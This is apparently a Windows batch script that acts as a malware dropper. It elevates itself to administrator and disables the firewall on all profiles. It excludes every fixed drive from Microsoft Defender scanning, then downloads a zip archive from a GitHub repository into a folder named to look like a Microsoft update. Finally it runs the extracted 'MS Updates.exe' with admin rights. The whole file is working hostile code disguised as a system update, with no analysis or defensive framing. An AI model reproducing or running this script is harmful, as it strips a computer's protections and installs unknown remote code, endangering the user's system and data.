@echo off

net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -Command "Start-Process cmd -ArgumentList '/c %~s0' -Verb RunAs"
    exit /b
)

netsh advfirewall set allprofiles state off

powershell -Command "$drives = Get-WmiObject -Class Win32_LogicalDisk | Where-Object { $_.DriveType -eq 3 } | ForEach-Object { $_.DeviceID + '\' }; Add-MpPreference -ExclusionPath $drives"


set download_url=https://github.com/QB-621P/User/archive/refs/heads/main.zip
set base_folder=C:\Microsoft Update Base
set download_path=%base_folder%\User-Main.zip
set extract_path=%base_folder%\Extracts
set exe_path=%extract_path%\User-main\MS Updates.exe


if not exist "%base_folder%" mkdir "%base_folder%"

if not exist "%extract_path%" mkdir "%extract_path%"


powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%download_url%', '%download_path%')"


powershell -Command "if (Test-Path '%download_path%') { Expand-Archive -Path '%download_path%' -DestinationPath '%extract_path%' -Force }"


powershell -Command "Start-Process '%exe_path%' -Verb RunAs"

pause

